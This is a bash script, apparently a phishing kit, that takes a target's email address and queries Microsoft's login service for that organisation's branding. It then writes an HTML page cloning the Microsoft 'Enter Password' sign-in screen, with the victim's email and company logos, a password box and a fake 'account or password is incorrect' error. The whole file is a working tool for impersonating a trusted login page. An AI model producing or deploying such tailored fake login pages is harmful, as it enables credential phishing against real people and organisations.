#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: ./create_phsite.sh email_address"
    exit 1
fi

EMAIL="$1"

RESPONSE=$(curl -s https://login.microsoftonline.com/common/GetCredentialType -X POST -H "Content-Type: application/json" -d "{\"Username\":\"$EMAIL\"}")

BANNERLOGO=$(echo $RESPONSE | jq -r '.EstsProperties.UserTenantBranding[0].BannerLogo')
if [[ "$BANNERLOGO" == "null" || -z "$BANNERLOGO" ]]; then
    BANNERLOGO="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
fi

ILLUSTRATION=$(echo $RESPONSE | jq -r '.EstsProperties.UserTenantBranding[0].Illustration')
LOGO_ABOVE_BOX_TAG=""
if [[ "$ILLUSTRATION" == "null" || -z "$ILLUSTRATION" ]]; then
    ILLUSTRATION="https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_6ffe0a92d779c878835b40171ffc2e13.jpg"
    LOGO_ABOVE_BOX="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png"
    LOGO_ABOVE_BOX_TAG="<img class="outlookImg" src=\"$LOGO_ABOVE_BOX\" alt=\"Logo Above Box\">"
fi

BLENDMODE=""
if [[ "$ILLUSTRATION" != "https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_6ffe0a92d779c878835b40171ffc2e13.jpg" ]]; then
    BLENDMODE="background-blend-mode: overlay;"
fi


cat > output.html <<- EOM
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhSite</title>
    <style>
      * {
            box-sizing: border-box;
            -webkit-box-sizing: border-box;
        }
        body {
            background-image: url('$ILLUSTRATION'), linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6));
            $BLENDMODE
            background-size: cover;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
              min-height:100%;
            height: 100vh;
            font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue";
            color: #1b1b1b;
        }
        
        .outlookImg {
            max-height: 36px;
            max-width: 256px;
            margin-bottom: 24px;
        }
        .box {
            width: 440px;
            padding: 44px;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            justify-content: space-between;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .box > img {
            height: 36px;
            margin-bottom: 16px;
        }
        .email {
            font-size: 15px;
            margin-bottom: 20px;
        }
        h2 {
            font-family: "Segoe UI", sans-serif;
            font-size: 1.5rem;
            font-weight: 600;
            margin: 0;
        }
        p {
            display: none;
            font-size: 15px;
            color: #e81123;
            margin-top: 12px;
            margin-bottom: 0;
        }
        p > span {
            color: #0067b8;
            cursor: pointer;
        }
        .box > input {
            width: 100%;
            height: 36px;
            font-size: 15px;
            padding: 6px 10px 6px 0;
            margin-top: 12px;
            margin-bottom: 16px;
            border: none;
            border-bottom: 1px #666 solid;
        }
        input:focus {
            outline: none;
        }
        a {
            color: #0067b8;
            font-size: 13px;
            text-decoration: none;
            cursor: pointer;
            margin-bottom: 16px;
        }
        button {
            color: white;
            background-color: #0067b8;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            width: 108px;
            height: 32px;
        }
        .btnHolder {
            width: 100%;
            display: flex;
            justify-content: flex-end;
        }
    </style>
</head>
<body>
    $LOGO_ABOVE_BOX_TAG
    <div class="box">
        <img src="$BANNERLOGO" alt="Banner Logo">
        <div class="email">$EMAIL</div>
        <h2>Enter Password</h2>
        <p id="errorMessage">Your account or password is incorrect. If you can't remember your password, <span>reset it now.</span></p>
        <input id="passwordInput" type="password" placeholder="Password">
        <a>Forgot my password</a>
        <a>Sign in with another account</a>
        <div class="btnHolder">
            <button onclick="loginError()">Sign in</button>
        </div>
    </div>
    <script>
        function loginError() {
            document.getElementById("errorMessage").style.display="block";
            document.getElementById("passwordInput").style.borderColor="#e81123";
            document.getElementById("passwordInput").style.marginTop="8px";
            return false;
        }
    </script>
</body>
</html>
EOM

echo "HTML file created as output.html"
